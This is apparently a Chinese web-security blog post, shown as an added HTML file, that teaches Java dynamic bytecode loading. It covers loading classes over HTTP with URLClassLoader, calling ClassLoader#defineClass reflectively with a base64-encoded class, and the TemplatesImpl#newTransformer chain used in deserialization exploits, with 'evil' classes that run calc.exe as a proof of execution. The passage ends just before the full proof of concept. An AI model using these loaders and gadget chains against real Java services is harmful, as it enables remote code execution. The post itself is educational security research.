@@ -1,0 +1,511 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Java篇之Java动态加载字节码 | Welcome to Arsene.Tang &#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  
+    <meta name="description" content="web安全">
+  
+  
+  
+    <link rel="alternate" href="/atom.xml" title="Welcome to Arsene.Tang 's Blog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/localshare/css/share.css">
+
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Welcome to Arsene.Tang &#39;s Blog</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">一个喜欢web安全但菜的离谱的萌新</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        
+          <a class="main-nav-link" href="/."><i class="fa fa-home"></i> 首页</a>
+        
+          <a class="main-nav-link" href="/archives/"><i class="fa fa-archive"></i> 归档</a>
+        
+          <a class="main-nav-link" href="/about/"><i class="fa fa-user"></i> 关于</a>
+        
+          <a class="main-nav-link" href="/atom.xml"><i class="fa fa-rss"></i> 订阅</a>
+        
+      </nav>
+    </div>
+    <div id="search-form">
+      <div id="result-mask" class="hide"></div>
+      <label><input id="search-key" type="text" autocomplete="off" placeholder="搜索"></label>
+      <div id="result-wrap" class="hide">
+        <div id="search-result"></div>
+      </div>
+      <div class="hide">
+        <template id="search-tpl">
+          <div class="item">
+            <a href="/{path}" title="{title}">
+              <div class="title">{title}</div>
+              <div class="time">{date}</div>
+              <div class="tags">{tags}</div>
+            </a>
+          </div>
+        </template>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-Java篇之动态加载字节码" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      Java篇之Java动态加载字节码
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2022-02-27T16:00:00.000Z" itemprop="datePublished">2022年02月28日</time>
+</span>
+      
+      
+        <span class="article-views">
+  <i class="fa fa-views"></i>
+  <i id="busuanzi_container_page_pv">
+      <i id="busuanzi_value_page_pv"></i>
+  </i>
+</span>
+
+      
+      
+<a href="/2022/02/28/Java%E7%AF%87%E4%B9%8B%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/#comments" class="article-comment-link">
+  
+    
+    
+    
+    
+    
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="Java动态加载字节码"><a href="#Java动态加载字节码" class="headerlink" title="Java动态加载字节码"></a>Java动态加载字节码</h1><p>接着学Java了，前段时间挖了挖洞，过段时间再来写写经历和体会吧，接下来我们来看看Java中动态加载字节码的方法，可以远程加载服务器上的字节码，或者本地的字节码就行</p>
+<span id="more"></span>
+
+<h2 id="Java字节码是啥"><a href="#Java字节码是啥" class="headerlink" title="Java字节码是啥"></a>Java字节码是啥</h2><p>简单点儿说，Java字节码就是<code>.class</code>后缀的文件，里面存放的是Java虚拟机执行使用的一类指令；因为Java也是一门编译型的语言，所以说我们在运行之前需要先编译一遍，编译过后就会形成<code>.class</code>文件，就可以运行在不同平台的JVM虚拟机中了；其实不只是Java语言，像什么<code>Scala</code>、<code>Kotlin</code>这样的语言编写的代码，只要能编译成<code>.class</code>文件，都可以在JVM虚拟机中运行了</p>
+<p>所以说字节码就是所有能被<strong>恢复成一个类</strong>，并且<strong>能在JVM虚拟机中加载的字节序列</strong>，都在我们的探讨范围内，这里偷张p神的图：</p>
+<p><img src="https://s2.loli.net/2022/02/27/pd4lmPN6IcTWf2a.png" alt="image.png"></p>
+<h2 id="URLClassLoader加载远程class文件"><a href="#URLClassLoader加载远程class文件" class="headerlink" title="URLClassLoader加载远程class文件"></a>URLClassLoader加载远程class文件</h2><p><code>ClassLoader</code>是一个加载器，就是用来告诉JVM虚拟机如何去加载这个类，默认的就是根据类名来加载类，这个类名需要是完整路径，比如说<code>java.lang.Runtime</code>；而这里我们提到的<code>URLClassLoader</code>，是默认加载器<code>AppClassLoader</code>的父类，所以说这个的工作过程实际上就是在介绍默认的Java类加载器的工作流程</p>
+<p>首先，java会根据基础路径去寻找<code>class</code>文件来加载，而这个基础路径有三种情况：</p>
+<ul>
+<li>URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader来寻找类，即为在Jar包中寻找.class文件</li>
+<li>URL以斜杠 / 结尾，且协议名是 file，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件</li>
+<li>URL以斜杠 / 结尾，且协议名不是file ，则使用最基础的Loader来寻找类</li>
+</ul>
+<p>所以说咱可以以斜杠<code>/</code>结尾，但又不用file协议，而是使用http协议，这样就可以用<code>Loader</code>来寻找类了</p>
+<p>那我们来试试http协议，看能不能从远程http服务器上加载<code>.class</code>文件，首先我们得先编译出一个class文件，源码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">eviltest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">eviltest</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的一个命令执行的代码，只要它新建了<code>eviltest</code>对象，访问了构造方法，它就能弹出计算器，接下来就用<code>javac</code>编译一下，然后将<code>.class</code>文件随便找个目录放着，然后在那个目录用<code>python</code>快速创建一个http服务器：<code>python3 -m http.server</code></p>
+<p><img src="https://s2.loli.net/2022/02/27/ny7LpITNVvglSaH.png" alt="image.png"></p>
+<p>然后就来写远程加载这个字节码的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UrlLoaderTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        URL[] urls = &#123;<span class="keyword">new</span> URL(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;;</span><br><span class="line">        URLClassLoader loader = URLClassLoader.newInstance(urls);</span><br><span class="line">        Class c = loader.loadClass(<span class="string">&quot;eviltest&quot;</span>);</span><br><span class="line">        c.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后那个<code>newInstance</code>相当于就是一个创建对象，那么自然就会调用默认的无参构造方法，运行它：</p>
+<p><img src="https://s2.loli.net/2022/02/27/Hwm7XprNDEtV6As.png" alt="image.png"></p>
+<p>很完美，弹出计算器，而且日志上也有体现</p>
+<h2 id="ClassLoader-defineClass直接加载字节码"><a href="#ClassLoader-defineClass直接加载字节码" class="headerlink" title="ClassLoader#defineClass直接加载字节码"></a>ClassLoader#defineClass直接加载字节码</h2><p>上面我们看到了利用<code>URLClassLoader</code>加载远程字节码，其实也就是<code>Java</code>中默认加载字节码的方法；接下来我们来看看<code>Java</code>加载字节码的方法的调用，无论是远程<code>class</code>文件，或者说本地的<code>class</code>或者<code>jar</code>文件，都是这样调用的</p>
+<p>首先是调用<code>ClassLoader</code>类中的<code>loadClass</code>方法，这个方法的作用是从已经加载的类缓存、父加载器等位置去寻找类，在没有找到类的情况下，就会交给<code>ClassLoader</code>类的<code>findClass</code>方法；然后<code>findClass</code>方法就是根据基础路径的方式，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后将字节码交给<code>ClassLoader</code>类的<code>defineClass</code>，<code>defineClass</code>的作用就是处理前面传入的字节码，将其处理为真正的Java类；<code>ClassLoader#loadClass  -&gt;  ClassLoader#findClass  -&gt;  ClassLoader#defineClass</code></p>
+<p>所以说真正的核心就是<code>defineClass</code>，它决定了怎么将一段字节流变成Java类，这个逻辑挺复杂的，在JVM中的C语言代码中，这儿就不深究了，直接看看它是咋个加载的就行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloDefineClass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Method defineClass = ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="keyword">byte</span>[].class, <span class="keyword">int</span>.class, <span class="keyword">int</span>.class);</span><br><span class="line">        defineClass.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] code = Base64.getDecoder().decode(<span class="string">&quot;yv66vgAAADQAHAoABgAPCgAQABEIABIKABAAEwcAFAcAFQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAWAQAKU291cmNlRmlsZQEADWV2aWx0ZXN0LmphdmEMAAcACAcAFwwAGAAZAQAIY2FsYy5leGUMABoAGwEACGV2aWx0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAGAAAAAAABAAEABwAIAAIACQAAAC4AAgABAAAADiq3AAG4AAISA7YABFexAAAAAQAKAAAADgADAAAAAgAEAAMADQAEAAsAAAAEAAEADAABAA0AAAACAA4=&quot;</span>);</span><br><span class="line">        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), <span class="string">&quot;eviltest&quot;</span>, code, <span class="number">0</span>, code.length);</span><br><span class="line">        hello.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>defineClass</code>这个方法是受保护的，所以说我们必须通过暴力反射来获取到它，然后这个字节码就是我们前面远程调用的那一段字节码经过了base64加密过后的，然后就是依然创建对象，在对象创建的时候调用无参构造方法，执行命令：</p>
+<p><img src="https://s2.loli.net/2022/02/27/Kq5TesWxAGnuYCX.png" alt="image.png"></p>
+<h2 id="利用TemplatesImpl加载字节码"><a href="#利用TemplatesImpl加载字节码" class="headerlink" title="利用TemplatesImpl加载字节码"></a>利用TemplatesImpl加载字节码</h2><p>前面我们介绍了<code>defineClass</code>，但因为<code>defineClass</code>方法作用域不开放，所以说很难直接利用它，而且大部分上层开发者也不会直接使用到，但是有一些Java底层的类用到了它，而它就是非常经典的<code>TemplatesImpl</code>，在反序列化中这个类是很重要的</p>
+<p>在<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>这个类中定义了一个内部类<code>TransletClassLoader</code>，而在这个类中重写了<code>defineClass</code>方法，而且这个方法并没有显式地声明定义域，也就是说它是一种默认的类型，也就是<code>default</code>类型的，而默认类型的是可以被类外部调用的，这就挺好，有了更大的利用空间了，看看它的代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TransletClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Map&lt;String,Class&gt; _loadedExternalExtensionFunctions;</span><br><span class="line">    TransletClassLoader(ClassLoader parent) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">    TransletClassLoader(ClassLoader parent,Map&lt;String, Class&gt; mapEF) &#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">        _loadedExternalExtensionFunctions = mapEF;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; loadClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class&lt;?&gt; ret = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// The _loadedExternalExtensionFunctions will be empty when the SecurityManager is not set and the FSP is turned off</span></span><br><span class="line">        <span class="keyword">if</span> (_loadedExternalExtensionFunctions != <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = _loadedExternalExtensionFunctions.get(name);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ret = <span class="keyword">super</span>.loadClass(name);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Access to final protected superclass member from outer class.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">    <span class="function">Class <span class="title">defineClass</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> defineClass(<span class="keyword">null</span>, b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为<code>TransletClassLoader</code>是内部类，所以说只允许<code>TemplatesImpl</code>类中的方法调用，那我们就往上看看，有没有方法调用了它，是有的，它就是<code>TemplatesImpl</code>类中的<code>defineTransletClasses()</code>方法，但它是一个<code>private</code>方法，代码如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_bytecodes == <span class="keyword">null</span>) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_TRANSLET_CLASS_ERR);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="keyword">int</span> classCount = _bytecodes.length;</span><br><span class="line">            _class = <span class="keyword">new</span> Class[classCount];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (classCount &gt; <span class="number">1</span>) &#123;</span><br><span class="line">                _auxClasses = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">                _class[i] = loader.defineClass(_bytecodes[i]);<span class="comment">//在这里调用了defineClass</span></span><br><span class="line">                <span class="keyword">final</span> Class superClass = _class[i].getSuperclass();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this is the main class</span></span><br><span class="line">                <span class="keyword">if</span> (superClass.getName().equals(ABSTRACT_TRANSLET)) &#123;</span><br><span class="line">                    _transletIndex = i;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> &#123;</span><br><span class="line">                    _auxClasses.put(_class[i].getName(), _class[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_transletIndex &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                ErrorMsg err= <span class="keyword">new</span> ErrorMsg(ErrorMsg.NO_MAIN_TRANSLET_ERR, _name);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ClassFormatError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_CLASS_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (LinkageError e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于它是<code>private</code>方法，所以说不能直接调用，再往上走，看看哪个函数调用了<code>defineTransletClasses()</code>方法，它就是<code>getTransletInstance</code>方法，源码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> Translet <span class="title">getTransletInstance</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (_name == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (_class == <span class="keyword">null</span>) defineTransletClasses();<span class="comment">//此处调用defineTransletClasses方法</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// The translet needs to keep a reference to all its auxiliary class to prevent the GC from collecting them</span></span><br><span class="line">            AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">                    _class[_transletIndex].getConstructor().newInstance();</span><br><span class="line">            translet.postInitialization();</span><br><span class="line">            translet.setTemplates(<span class="keyword">this</span>);</span><br><span class="line">            translet.setOverrideDefaultParser(_overrideDefaultParser);</span><br><span class="line">            translet.setAllowedProtocols(_accessExternalStylesheet);</span><br><span class="line">            <span class="keyword">if</span> (_auxClasses != <span class="keyword">null</span>) &#123;</span><br><span class="line">                translet.setAuxiliaryClasses(_auxClasses);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> translet;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (InstantiationException | IllegalAccessException |</span><br><span class="line">                NoSuchMethodException | InvocationTargetException e) &#123;</span><br><span class="line">            ErrorMsg err = <span class="keyword">new</span> ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> TransformerConfigurationException(err.toString(), e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>也是<code>private</code>方法，得再往上看，找到了<code>newTransformer()</code>方法，这里就是<code>public</code>方法了，可以直接调用：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> Transformer <span class="title">newTransformer</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        TransformerImpl transformer;</span><br><span class="line"></span><br><span class="line">        transformer = <span class="keyword">new</span> TransformerImpl(getTransletInstance(), _outputProperties,</span><br><span class="line">            _indentNumber, _tfactory);<span class="comment">//调用了getTransletInstance方法</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_uriResolver != <span class="keyword">null</span>) &#123;</span><br><span class="line">            transformer.setURIResolver(_uriResolver);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (_tfactory.getFeature(XMLConstants.FEATURE_SECURE_PROCESSING)) &#123;</span><br><span class="line">            transformer.setSecureProcessing(<span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> transformer;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>这样一条完整的利用链就下来了：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl#newTransformer() -&gt; TemplatesImpl#getTransletInstance() -&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">-&gt; TransletClassLoader#defineClass()</span><br></pre></td></tr></table></figure>
+
+<p>也就是说只要我们执行<code>newTransformer()</code>方法就能触发利用链了</p>
+<p>然后我们还得设置<code>TemplatesImpl</code>对象的三个私有属性，这里我们用反射设置就行，三个属性：<code> _bytecodes</code> 、<code> _name</code> 和 <code>_tfactory</code> ， <code>_bytecodes</code> 是由字节码组成的数组； <code>_name</code> 可以是任意字符串，只要不为 null 即可； <code>_tfactory</code> 需要是一个<code>TransformerFactoryImpl</code> 对象，因为<code>TemplatesImpl#defineTransletClasses()</code> 方法里有调用到 <code>_tfactory.getExternalExtensionsMap()</code> ，如果是null会出错。</p>
+<p>但是，<code>TemplatesImpl</code>中对加载的字节码还有一定的要求，这个字节码对应的类必须要是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>的子类，所以我们还得构造一个特殊的类，用这个类生成字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">evil</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator,</span></span></span><br><span class="line"><span class="params"><span class="function">                          SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">evil</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();</span><br><span class="line">        String[] command = &#123;<span class="string">&quot;calc.exe&quot;</span>&#125;;</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译这个类得到字节码之后，我们就来写POC，就新建一个<code>TemplatesImpl</code>对象，把属性设置进去然后执行<code>newTransformer</code>方法触发，主要是咱得先写一个利用反射给私有属性赋值的一个方法<code>setFieldValue</code>：</p>
